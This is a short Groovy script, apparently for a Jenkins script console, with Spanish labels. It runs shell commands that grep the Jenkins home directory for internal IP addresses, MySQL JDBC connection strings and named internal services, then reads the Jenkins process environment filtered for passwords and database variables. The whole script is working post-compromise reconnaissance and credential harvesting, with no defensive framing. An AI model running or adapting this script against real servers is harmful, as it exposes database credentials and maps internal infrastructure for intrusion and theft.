def run = { List c ->
  try {
    def p = c.execute()
    def out = p.inputStream.text
    def err = p.errorStream.text
    p.waitFor()
    return (out + err).trim()
  } catch (Exception e) { return "ERR: " + e.message }
}

println("=== hosts internos en configs ===")
println(run(['sh','-c','grep -rIl "172.27.141" /var/jenkins_home --include="*.xml" --include="*.groovy" --include="*.properties" --include="*.yml" --include="*.yaml" --include="*.json" 2>/dev/null | head -30; echo END']))
println("=== jdbc mysql strings ===")
println(run(['sh','-c','grep -rIh "jdbc:mysql" /var/jenkins_home 2>/dev/null | sort -u | head -40; echo END']))
println("=== dbasears / mrc-services ===")
println(run(['sh','-c','grep -rIh -i "dbasears\\|mrc-services\\|t1pagos\\|apifincadob" /var/jenkins_home 2>/dev/null | sort -u | head -40; echo END']))
println("=== env vars del proceso jenkins ===")
println(run(['sh','-c','cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | grep -i -E "mysql|db|pass|database" | head -30; echo END']))
println("DONE")
